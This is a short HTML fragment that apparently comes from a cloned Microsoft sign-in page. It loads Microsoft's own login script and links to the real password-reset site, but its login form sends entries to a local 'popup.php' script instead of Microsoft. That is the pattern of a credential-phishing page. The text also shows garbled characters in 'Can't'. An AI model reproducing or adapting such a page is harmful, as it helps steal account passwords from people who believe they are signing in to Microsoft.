...
<script src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4212.8/content/cdnbundles/aad.login.min.js"></script>
    ...
    <div id="loginArea">        
        ...
        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="popup.php">
...
<div id="recover_container" class="subtext smalltext">
            <span>
                <a id="cred_forgot_password_link" tabindex="12"
                    href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAbNSzygpKSi20tfPLy3Jyc_P1stPS8tMTjU2M9VLzs_Vyy9Kz0wBsaKYgQqKhLgEIh480Kgx5PLfdabxR9FtFpdZjDzFqblJyflFBSB1qxiV8Jqon1-eqH-BkXETE7uvk2d8cLDPCabLn_lvMQn6F6V7poQXu6WmpBYllmTm5z1i4g0tTi3yz8upDMnPTs2bxMyXk5-emRdfXJQWn5aTXw4UAJpYkJhcEl-SmZydWrKLWSXZzCTRxNLERNcgLcVS1yQ51VzXwsIgTTfJyDzN3NIiMcks1ewCi8APFsZFrEDfHBJsamCfmem1wtZeau6pjku7OG0JO9--KDUxJ9cW2dtqZSm2uYmZOQA1&amp;mkt=en-US">CanвЂ™t access your account?</a>
            </span>
        </div>
